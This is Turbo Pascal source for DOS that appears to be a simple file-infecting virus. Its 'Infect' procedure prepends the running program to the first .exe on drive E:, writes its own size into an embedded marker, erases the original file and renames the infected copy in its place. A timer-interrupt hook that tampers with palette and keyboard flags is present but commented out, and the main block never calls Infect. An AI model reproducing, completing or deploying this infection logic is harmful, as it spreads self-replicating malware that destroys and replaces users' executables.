{$M 10000,0,0}
{$F+,W+}

Uses Crt,Dos,ExitErr;

var
  Clock_Ticks : longint absolute $0040:$006C; { BIOS timer ticks }

  KBDStatus   : byte absolute $0:$0417;

Const    Escape      : array[1..5] of char = (#1,#2,#3,#4,#5);
         CodeEndOffs : longint             = 0;

         KbdInt     = $09;
         KbdTrapInt = $15;
         TimerInt   = $08;

         MinIntensity = 0;
         MaxIntensity = 63;

         Num = $20;
         Scr = $10;
         Cap = $40;

type
         ColourRange  = MinIntensity..MaxIntensity;
         RGBType      = Record r, g, b   : ColourRange; end;


Var Critical: byte absolute $011c:0320;
    Dos_Busy: byte absolute $011c:0321;

Var      Regs         : registers;
         OldKbdTrapVec: pointer;
         OldKbdVec    : pointer;
         OldTimerVec  : pointer;

         RGB : RGBType;
         filetorun:string;

         x,y:byte;

         tempval :longint;

Procedure SetRegister(register : Byte; colour : ColourRange); Assembler;
        ASM
        MOV     BH, colour
        MOV     BL, register
        MOV     AX, 1000h
        INT     10h
   end;  { SetRegister }

Procedure SetRGBValue(register : Byte; RGB : RGBType); Assembler;
     ASM
        PUSH    DS
        LDS     SI, RGB
        XOR     BX, BX
        MOV     BL, register
        LODSB
        MOV     DH, AL
        LODSW
        XCHG    CX, AX
        XCHG    CH, CL
        MOV     AX, 1010h
        INT     10h
        POP     DS
end;  { SetRGBValue }

procedure clock(flags,cs,ip,ax,bx,cx,dx,si,di,ds,es,bp:word); interrupt;
  var i:byte;
  var reg: registers;
  begin

  asm
   call OldTimerVec;
  end;

  Inline($FA); { intsoff }

  if ((Dos_busy=0) and (critical=0)) then
   begin
   for i:=1 to 100 do tempval:=trunc(sqrt(clock_ticks));
   If (clock_ticks and 2)=0 then
    begin

{    setregister(random(16)-1,random(64)-1);}

{    KbdStatus := KbdStatus XOR Num;
    KbdStatus := KbdStatus XOR Cap;
    KbdStatus := KbdStatus XOR Scr;}

{    x:=wherex;
    y:=wherey;

    gotoxy(60,1);

    write((clock_ticks / (18.2*3600*24)),':',
     (clock_ticks mod trunc ((18.2*3600*24)) ) *3600);

    gotoxy(x,y);}
    end;
   end;
  inline($FB); { intson }
  end;


procedure Infect;
 var thisfile      :file;
     outputrunfile :file;

     infectfile    :file;
     Outinfectfile :file;

     curofs        :longint;

     bffr          :byte;
     matchid       :array[1..5] of char;

     tval          :longint;

     s             :searchrec;

 begin
 assign(thisfile,paramstr(0));
 reset(thisfile,1);

 if CodeEndOffs=0 then
  begin
  findfirst('e:\*.exe',anyfile,s);

  assign(infectfile,'e:\'+s.name);
  reset(infectfile,1);

  assign(outinfectfile,'e:\blah.dud');
  rewrite(outinfectfile,1);

  for curofs:=1 to filesize(thisfile) do
   begin
   seek(thisfile,curofs-1);
   seek(outinfectfile,curofs-1);
   blockread(thisfile,bffr,1);
   blockwrite(outinfectfile,bffr,1);
   end;

  tval:=filesize(thisfile);

  for curofs:=1 to filesize(outinfectfile)-6 do
   begin
   seek(outinfectfile,curofs-1);
   blockread(outinfectfile,matchid,5);
   if ((matchid[1]=#1) and (matchid[3]=#3) and (matchid[5]=#5)) then
     begin
     seek(outinfectfile,curofs+5-1);
     blockwrite(outinfectfile,longint(tval),sizeof(longint));
     end;
   end;

  seek(outinfectfile,filesize(thisfile));
  for curofs:=0 to filesize(infectfile) do
    begin
    blockread(infectfile,bffr,1);
    blockwrite(outinfectfile,bffr,1);
    end;

  close(infectfile);
  erase(infectfile);

  close(outinfectfile);
  rename(outinfectfile,s.name);
  filetorun:='';

  writeln('infected ',s.name);
  end;

 end;


Procedure Finale;
  var a:word;
  begin
  if not(exitcode=0) then
    begin
    writeln(errorstring(exitcode));
    end;
  end;

var f:file;
   p:pointer;

begin
{  directvideo:=true;
  GetIntVec(TimerInt, OldTimerVec);
  SetIntVec(TimerInt, @clock);

  exec(getenv('COMSPEC'),'');
 }
stacklimit:=200;
exitproc:=@finale;


runerror(89);
end.